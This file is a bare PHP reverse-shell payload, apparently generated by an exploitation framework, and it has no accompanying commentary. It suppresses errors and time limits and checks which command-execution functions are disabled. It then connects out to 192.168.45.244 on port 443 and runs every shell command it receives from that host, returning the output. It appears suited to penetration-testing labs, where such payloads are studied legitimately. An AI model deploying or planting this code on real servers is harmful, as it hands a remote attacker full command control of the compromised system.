/*<?php /**/
@error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
$dis=@ini_get('disable_functions');
if(!empty($dis)){
  $dis=preg_replace('/[, ]+/',',',$dis);
  $dis=explode(',',$dis);
  $dis=array_map('trim',$dis);
}else{
  $dis=array();
}

    $ipaddr='192.168.45.244';
    $port=443;

    if(!function_exists('OxszEbo')){
      function OxszEbo($c){
        global $dis;
        if (FALSE!==stristr(PHP_OS,'win')){
  $c=$c." 2>&1\n";
}
$y_L3N='is_callable';
$JFWJJm7='in_array';
if($y_L3N('system')&&!$JFWJJm7('system',$dis)){
  ob_start();
  system($c);
  $o=ob_get_contents();
  ob_end_clean();
}else
if($y_L3N('popen')&&!$JFWJJm7('popen',$dis)){
  $fp=popen($c,'r');
  $o=NULL;
  if(is_resource($fp)){
    while(!feof($fp)){
      $o.=fread($fp,1024);
    }
  }
  @pclose($fp);
}else
if($y_L3N('proc_open')&&!$JFWJJm7('proc_open',$dis)){
  $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
  $o=NULL;
  while(!feof($pipes[1])){
    $o.=fread($pipes[1],1024);
  }
  @proc_close($handle);
}else
if($y_L3N('passthru')&&!$JFWJJm7('passthru',$dis)){
  ob_start();
  passthru($c);
  $o=ob_get_contents();
  ob_end_clean();
}else
if($y_L3N('exec')&&!$JFWJJm7('exec',$dis)){
  $o=array();
  exec($c,$o);
  $o=join(chr(10),$o).chr(10);
}else
if($y_L3N('shell_exec')&&!$JFWJJm7('shell_exec',$dis)){
  $o=`$c`;
}else
{
  $o=0;
}

        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://192.168.45.244",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=OxszEbo(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=OxszEbo(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }
